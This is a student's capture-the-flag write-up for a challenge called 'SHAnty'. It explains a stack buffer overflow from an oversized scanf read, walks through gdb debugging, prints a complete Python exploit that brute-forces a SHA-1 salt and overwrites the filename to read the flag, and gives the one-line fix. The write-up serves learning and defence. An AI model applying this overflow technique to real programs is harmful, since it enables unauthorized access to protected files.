**Name:** flofriday

**Points:** 1 of 1 Points

<hr>

# SHAnty

## Overview

The given program `shanty` asks for a password and if the password is correct it will print the content of the file `/challenges/shanty/info` to stdout.

## Vulnerability

The bufferoverflow vulnerabillity is in line 43 where the program tries to read 70 characters (69 input characters plus 1 byte null-terminator) into the buffer `password` which is only 20 characters long, thereby allowing an attacker to overwrite other memory on the stack.

```c
scanf("%69s", password);
```

## Exploitation

During development of this exploit I was on a call with █████, █████ and later on another call with █████. On those calls we discussed the problems, possible strategies but never shared code or flags.

The first step is to build the code ourself, so that we can debug the program with `gdb`.

```bash
mkdir $HOME/shanty
cd shanty
cp /challenges/shanty/shanty.c /challenges/shanty/Makefile .
```

Now we have copied the source files into a subdirectory of our homefolder. However, before we can build the binary, we need to patch the `Makefile` by removing all `chmod` and `chown` commands and adding the `-g` compile flag, so that our binary contains debug symbols. The modiefied Makefile looked like this:

```makefile
CFLAGS=-Wall -Wextra -pedantic -ansi -m32 -fno-stack-protector -g
LIBS=-lcrypto

shanty: shanty.c
        gcc $(CFLAGS) shanty.c -o shanty $(LIBS)

clean:
        rm -f shanty
```

By executing the following two commands we can compile the program and open it with `gdb`.

```bash
make shanty
gdb shanty
```

After inspecting the source code in `main.c` we can assume that the vulnarbility is a bufferoverflow. We can now test this hypotheses by starting the program in gdb, setting a breakpoint at line `44` with `br 44` and when asked for a password entering over seventy `"A"`. Once we hit the breakpoint we can inspect the variables with `print/x password` to see the hex values of each byte in the buffer. By further inspecting all variables of the main function we can see that we can overwrite `password`, `salt`, `filename` as well as the first 17 bytes of `correct_hash`. The 18th byte of `correct_hash` was overwritten by the null-terminator and the 19th and 20th bytes still remained from the original `correct__hash`.

To exploit the program we need to create a payload to fulfill the following criteria:

- **bytes 01-20:** Any password, however the 20th byte must be zero, because the C-code reads the length in line 46 to calculate the hash.

- **bytes 21-28:** Any salt.

- **bytes 28-54:** The string `"/challenges/shanty/flag\0"`, to read out the flag and not the `info` file.

- **bytes 54-69:** The first 17 bytes of the hash calculated from our salt concatenated with our password.

- Further, we need to guess (bruteforce) either the salt or password (or both) so that the resulting hash ends in the bytes `0x00, 0xc1, 0x03`.

- Finally, scanf stops at any whitespace character, therefore our payload cannot contain any of the following characters: `" \t\n\r\f\v"`.

For my exploit, I decided to set the password to something funny, and only guess the salt. My script also wirtes the hex values to `stderr` for easy comparison with `gdb` and only writes the correct payload to `stdout`. My exploit in `expl.py` looks like this:

```python
import hashlib
import sys
import random
import string

# Setup variables
file_name = b"/challenges/shanty/flag\0"
pswd = b"flotschi_was_here" # 17 chars here
pswd_fill = b'\0\0\0' # Needed to fill the password to stretch to 20chars
whitespaces = b' \t\n\r\f\v'

# Guess the salt
print('Brutforcing the salt... (this may take a while)', file=sys.stderr)
while True:
    salt = b''
    for _ in range(8):
        salt += random.choice(string.ascii_letters).encode('ascii')

    m = hashlib.sha1()
    m.update(salt + pswd)
    hash = m.digest()

    # The last bytes of the hash must match and we cannot enter
    # whitespaces into scanf
    if hash[-3:] == b"\x00\xc1\x03" and not any(ch in hash for ch in whitespaces):
        break

# Write debug output to stderr in hex to compare with gdb
payload = pswd + pswd_fill + salt + file_name + hash
print(f''' --- HEX DEBUG VALUES ---
Password: {(pswd + pswd_fill).hex()}
Filename: {file_name.hex()}
    Salt: {salt.hex()}
    Hash: {hash.hex()}
 Payload: {payload.hex()}
''',file=sys.stderr)

# Write correct payload to stdout
sys.stdout.buffer.write(payload)
```

To run the script and get the flag enter:

```bash
python3 expl.py | /challenges/shanty/shanty
```

## Solution

To fix the program, line 43 should be changed to:

```c
scanf("%19s", password);
```

With this change any attacker could only write to the 20 chars (19 actual characters and 1 null-terminator) of the `password` buffer, and thereby no longer overwrite other memory like the `salt`, `correct_hash` or `file_name`.
